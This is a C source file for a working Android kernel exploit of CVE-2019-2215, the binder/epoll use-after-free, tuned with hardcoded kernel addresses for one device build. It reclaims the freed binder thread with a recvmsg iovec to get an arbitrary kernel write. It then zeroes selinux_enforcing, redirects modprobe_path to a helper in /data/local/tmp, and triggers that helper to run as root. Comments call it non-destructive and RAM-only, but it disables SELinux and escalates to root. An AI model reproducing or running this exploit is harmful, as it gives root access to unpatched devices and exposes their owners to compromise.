/*
 * broot9 - CVE-2019-2215 (binder epoll use-after-free) shaped for this device.
 *
 * The stale pointer is epoll's.  binder_poll() arms poll_wait(&thread->wait) only in the
 * state todo-empty && return_error==BR_OK && NEED_RETURN cleared && transaction_stack!=NULL
 * (binder.c:2142/2611/2625).  arm_pending_tx() puts the thread in exactly that state with
 * one synchronous BC_TRANSACTION to handle 0, then drains the BR_TRANSACTION_COMPLETE the
 * send itself queued.  BINDER_THREAD_EXIT then kfree()s the thread -- and this 3.18
 * binder_free_thread() never reaps that wait queue, so the eppoll_entry keeps
 * pwq->whead pointing into the freed slot.
 *
 * A later EPOLL_CTL_DEL runs remove_wait_queue(whead, &pwq->wait) on freed memory.  The
 * entry's task_list next/prev both equal &head->task_list = slot+0x50, so
 *   *(slot+0x50+8) = slot+0x50   and   *(slot+0x50+0) = slot+0x50
 * i.e. the iovec array that reclaimed the slot now has
 *   iov[5] = { iov_base = slot+0x50, iov_len = <huge kernel pointer> }.
 * The socket receive path copies with __copy_to_user (no access_ok) and reads iov_base /
 * iov_len live while the total budget stays fixed at the import-time sum, so one installer
 * chunk lands *inside the slot* at 0x50 -- healing iov[5].iov_len to exactly its own size so
 * the iterator advances -- and thereby re-aims iov[6], iov[7], iov[8], ...  The next chunk
 * is then copied to those re-aimed addresses: arbitrary kernel write, attacker-chosen data,
 * several targets in one round.
 *
 * Reclaim is the only probabilistic step (the freed slot must be handed to recvmsg's
 * kmalloc(400)), so this loops and verifies every attempt; the probe verifier is a marker
 * in our own process, so a MISS is free and a HIT proves the chain escaped the slot.
 *
 * Modes, in the order they are meant to run:
 *   probe        target = our own marker byte cell (non-destructive proof)
 *   probe_nodel  negative control: no EPOLL_CTL_DEL, marker must stay untouched
 *   enforce      4 zero bytes over selinux_enforcing          (RAM only, reboot restores)
 *   path         24 bytes over modprobe_path -> our helper path (RAM only)
 *   trigger      exec a bad-magic file so the kernel runs modprobe_path as root
 * Nothing is ever written to flash or to any partition.
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <unistd.h>

#define BINDER_WRITE_READ 0xc0306201
#define BINDER_THREAD_EXIT 0x40046208
#define BC_TRANSACTION 0x40406300
#define BR_TRANSACTION_COMPLETE 0x7206
#define BR_REPLY 0x80407203
#define BR_DEAD_REPLY 0x80007205

#define THREAD_SZ 0x128UL	/* sizeof(struct binder_thread), measured off our Image */
#define WQ_OFF 0x48UL			/* wait_queue_head_t: lock@0x48, next@0x50, prev@0x58 */
#define SEG_LOCK (WQ_OFF / 16)		/* entry whose iov_len IS the spinlock word */
#define SEG_POISON (SEG_LOCK + 1)	/* entry the list_del rewrites */
static int g_iovsz = 25;		/* entries; 16*len picks the kmalloc class */
#define INSTALL_LEN 0x50UL		/* installer size == what iov[5] must heal to */
#define FILLER 0x8000UL

/* static kernel addresses: this build has no KASLR */
#define SELINUX_ENFORCING 0xffffffc00189be74UL
#define MODPROBE_PATH 0xffffffc001635a30UL
#define HELPER "/data/local/tmp/rootsh"

#define MARKER_SEED 0x1122334455667788UL
#define MARKER_HIT 0xCAFEBABEDEADBEEFUL

struct txn {
	unsigned long long target;
	unsigned long long cookie;
	unsigned int code, flags;
	int sender_pid;
	unsigned int sender_euid;
	unsigned long long data_size, offsets_size;
	unsigned long long buffer, offsets;
};
struct bwr {
	unsigned long long write_size, write_consumed, write_buffer;
	unsigned long long read_size, read_consumed, read_buffer;
};

static volatile unsigned long g_marker;
static int g_cpupin = -1;

static void die(const char *m)
{
	fprintf(stderr, "FATAL %s: %s\n", m, strerror(errno));
	exit(1);
}

static void pin(int cpu)
{
	cpu_set_t s;

	CPU_ZERO(&s);
	CPU_SET(cpu, &s);
	if (sched_setaffinity(0, sizeof s, &s))
		fprintf(stderr, "pin %d: %s\n", cpu, strerror(errno));
}

/* Leave the thread with one outstanding synchronous transaction and an empty todo:
 * the only state where binder_poll() registers the epoll entry on &thread->wait.
 * Returns 0 when armed, -1 when this round must be thrown away.
 */
static int arm_pending_tx(int fd)
{
	struct txn t;
	struct bwr b;
	unsigned char wbuf[4 + sizeof(t)];
	char payload[16];
	int attempt;

	memset(payload, 0, sizeof payload);
	memset(&t, 0, sizeof t);
	t.target = 0;			/* context manager */
	t.code = 2;			/* check_service */
	t.flags = 0;			/* synchronous -> transaction_stack keeps it */
	t.data_size = sizeof payload;
	t.buffer = (unsigned long long)(unsigned long)payload;

	memset(wbuf, 0, sizeof wbuf);
	*(unsigned int *)wbuf = BC_TRANSACTION;
	memcpy(wbuf + 4, &t, sizeof t);

	memset(&b, 0, sizeof b);
	b.write_size = sizeof wbuf;
	b.write_buffer = (unsigned long long)(unsigned long)wbuf;
	errno = 0;
	if (ioctl(fd, BINDER_WRITE_READ, &b))
		return -1;

	for (attempt = 0; attempt < 3; attempt++) {
		unsigned char rbuf[256];
		size_t off = 0;
		int complete = 0, reply = 0;

		memset(rbuf, 0, sizeof rbuf);
		memset(&b, 0, sizeof b);
		b.read_size = sizeof rbuf;
		b.read_buffer = (unsigned long long)(unsigned long)rbuf;
		errno = 0;
		if (ioctl(fd, BINDER_WRITE_READ, &b))
			return -1;
		while (off + 4 <= b.read_consumed) {
			unsigned int cmd;

			memcpy(&cmd, rbuf + off, 4);
			off += 4;
			if (cmd == BR_TRANSACTION_COMPLETE)
				complete = 1;
			else if (cmd == BR_REPLY || cmd == BR_DEAD_REPLY) {
				reply = 1;
				off += 64;
			}
		}
		if (complete && !reply)
			return 0;
		if (reply)
			return -1;
	}
	return -1;
}

static int read_enforce(void)
{
	unsigned char c = '?';
	int e = open("/sys/fs/selinux/enforce", O_RDONLY);
	int v = -1;

	if (e >= 0) {
		if (read(e, &c, 1) == 1)
			v = c - '0';
		close(e);
	}
	return v;
}

/* exec a file whose first bytes are not a known magic: search_binary_handler() fails
 * and the kernel calls request_module("binfmt-%08x") -> call_usermodehelper(modprobe_path).
 * With modprobe_path re-aimed at our helper this runs it as root, uid 0, in RAM only.
 */
static int fire_trigger(void)
{
	unsigned char bad[8] = { 0x01, 0x01, 0x01, 0x01, 0, 0, 0, 0 };
	const char *p = "/data/local/tmp/badmagic";
	int fd, rc;

	fd = open(p, O_WRONLY | O_CREAT | O_TRUNC, 0755);
	if (fd < 0) {
		perror("badmagic open");
		return -1;
	}
	if (write(fd, bad, sizeof bad) != (long)sizeof bad)
		perror("badmagic write");
	close(fd);
	chmod(p, 0755);
	unlink("/data/local/tmp/rootsh.ok");
	rc = fork();
	if (rc == 0) {
		char *av[] = { (char *)p, NULL };
		execv(p, av);
		_exit(127);		/* ENOEXEC here is expected and harmless */
	}
	if (rc > 0)
		waitpid(rc, NULL, 0);
	sleep(2);
	fd = open("/data/local/tmp/rootsh.ok", O_RDONLY);
	if (fd < 0) {
		printf("trigger: no rootsh.ok -> helper did not run\n");
		return -1;
	}
	close(fd);
	printf("trigger: /data/local/tmp/rootsh.ok exists -> helper ran\n");
	return 0;
}

int main(int argc, char **argv)
{
	const char *mode = argc > 1 ? argv[1] : "probe";
	int do_enforce = strcmp(mode, "enforce") == 0;
	int do_path = strcmp(mode, "path") == 0;
	int ntarget, tries = argc > 2 ? atoi(argv[2]) : 2000;
	int i, fd, epfd, r, status, armed = 0, wrongcount = 0;
	int socks[2];
	pid_t kid;
	unsigned long long *inst, *pay;
	struct iovec *iov;
	char *filler;
	unsigned long long readback;
	int ok = 0;

	if (strcmp(mode, "trigger") == 0)
		return fire_trigger() ? 1 : 0;
	if (strcmp(mode, "probe_nodel") == 0)
		tries = 1;

	/* one target for probe/enforce, three for path */
	ntarget = do_path ? 3 : 1;

	if (argc > 3)
		g_cpupin = atoi(argv[3]);
	if (argc > 4)
		g_iovsz = atoi(argv[4]);
	if (g_iovsz < 8 || g_iovsz > 160)
		die("iovlen out of range");
	if (g_cpupin >= 0)
		pin(g_cpupin);
	printf("mode=%s cpu=%d seg_lock=%lu seg_poison=%lu iovsz=%d install=%#lx tries=%d ntarget=%d\n",
	       mode, sched_getcpu(), SEG_LOCK, SEG_POISON, g_iovsz, INSTALL_LEN, tries, ntarget);
	fflush(stdout);

	inst = malloc(8 * 10);
	pay = malloc(8 * 10);
	iov = malloc(g_iovsz * sizeof *iov);
	filler = malloc(FILLER + 0x2000);
	if (!inst || !pay || !iov || !filler)
		die("malloc");

	g_marker = MARKER_SEED;

	/* installer qwords, copied to slot+0x50.
	 * pair 0 keeps segment 5 consistent (base back to user memory, len == bytes just
	 * copied) so the iterator advances to segment 6; pairs 1..ntarget re-aim the
	 * segments that the payload will be copied through.
	 */
	memset(inst, 0, 8 * 10);
	inst[0] = (unsigned long long)(unsigned long)filler;
	inst[1] = INSTALL_LEN;
	if (do_path) {
		inst[2] = MODPROBE_PATH;
		inst[3] = 8;
		inst[4] = MODPROBE_PATH + 8;
		inst[5] = 8;
		inst[6] = MODPROBE_PATH + 16;
		inst[7] = 8;
	} else {
		inst[2] = do_enforce ? SELINUX_ENFORCING : (unsigned long)&g_marker;
		inst[3] = do_enforce ? 4 : 8;
	}

	/* payload: distributed across the re-aimed segments in order, 8 bytes each */
	memset(pay, 0, 8 * 10);
	if (do_path) {
		memcpy(&pay[0], "/data/lo", 8);
		memcpy(&pay[1], "cal/tmp/", 8);
		memcpy(&pay[2], "rootsh", 6);	/* + NUL padding, 22 bytes then two NULs */
	} else if (do_enforce) {
		pay[0] = 0;
	} else {
		pay[0] = MARKER_HIT;
	}

	for (i = 0; i < tries && !ok; i++) {
		struct epoll_event ev = { .events = EPOLLIN };
		int payload_len = do_path ? 24 : (do_enforce ? 4 : 8);
		int seg;

		fd = open("/dev/binder", O_RDONLY);
		if (fd < 0)
			die("open /dev/binder");
		epfd = epoll_create(1000);
		if (epfd < 0)
			die("epoll_create");

		if (arm_pending_tx(fd) != 0) {
			close(fd);
			close(epfd);
			continue;
		}
		armed++;
		if (epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &ev))
			die("epoll_add");

		if (socketpair(AF_UNIX, SOCK_STREAM, 0, socks))
			die("socketpair");

		/* fork before the free: the parent must go from kfree(thread) straight into
		 * recvmsg's iovec kmalloc, same CPU, nothing allocating in between.
		 */
		kid = fork();
		if (kid < 0)
			die("fork");
		if (kid == 0) {
			prctl(PR_SET_PDEATHSIG, SIGKILL);
			if (g_cpupin >= 0)
				pin(g_cpupin ^ 1);
			close(socks[0]);
			usleep(60000);
			if (strcmp(mode, "probe_nodel") != 0 &&
			    epoll_ctl(epfd, EPOLL_CTL_DEL, fd, &ev))
				_exit(7);
			if (write(socks[1], inst, INSTALL_LEN) != (long)INSTALL_LEN)
				_exit(8);
			usleep(20000);
			if (write(socks[1], pay, payload_len) < 0)
				_exit(9);
			close(socks[1]);
			_exit(0);
		}
		close(socks[1]);

		if (ioctl(fd, BINDER_THREAD_EXIT, NULL))
			printf("  THREAD_EXIT: %s\n", strerror(errno));

		memset(iov, 0, g_iovsz * sizeof *iov);
		iov[SEG_LOCK].iov_base = filler;
		iov[SEG_LOCK].iov_len = 0;	/* the spinlock word must read 0 */
		iov[SEG_POISON].iov_base = filler;
		iov[SEG_POISON].iov_len = INSTALL_LEN;
		for (seg = 0; seg < ntarget; seg++) {
			iov[SEG_POISON + 1 + seg].iov_base = filler + 0x400 + seg * 0x100;
			iov[SEG_POISON + 1 + seg].iov_len = 8;
		}
		iov[SEG_POISON + 1 + ntarget].iov_base = filler + 0x1000;
		iov[SEG_POISON + 1 + ntarget].iov_len = FILLER;

		struct msghdr m;

		memset(&m, 0, sizeof m);
		m.msg_iov = iov;
		m.msg_iovlen = g_iovsz;
		r = recvmsg(socks[0], &m, MSG_WAITALL);

		if (do_enforce || do_path) {
			/* /proc/sys/kernel/modprobe is unreadable for shell until permissive,
			 * so path mode is judged by getenforce plus, later, the trigger.
			 */
			readback = (unsigned long long)read_enforce();
			if (readback == 0)
				ok = 1;
		} else if (g_marker == MARKER_HIT) {
			ok = 1;
		} else if (g_marker != MARKER_SEED) {
			wrongcount++;
			printf("try %d: marker = %#lx (unexpected)\n", i, g_marker);
			g_marker = MARKER_SEED;
			if (wrongcount > 3)
				break;
		}
		if ((i & 255) == 255 || ok)
			printf("try %d: armed=%d recvmsg=%d marker=%#lx enforce=%lld%s\n",
			       i, armed, r, g_marker, (long long)read_enforce(),
			       ok ? "   <== HIT" : "");
		fflush(stdout);
		waitpid(kid, &status, 0);
		close(socks[0]);
		close(fd);
		close(epfd);
		if (strcmp(mode, "probe_nodel") == 0)
			break;		/* control runs once */
	}

	printf("final marker=%#lx final selinux=%lld\n", g_marker, (long long)read_enforce());
	printf("RESULT: %s (%s) after %d armed attempts\n", ok ? "HIT" : "MISS", mode, armed);
	return ok ? 0 : 1;
}
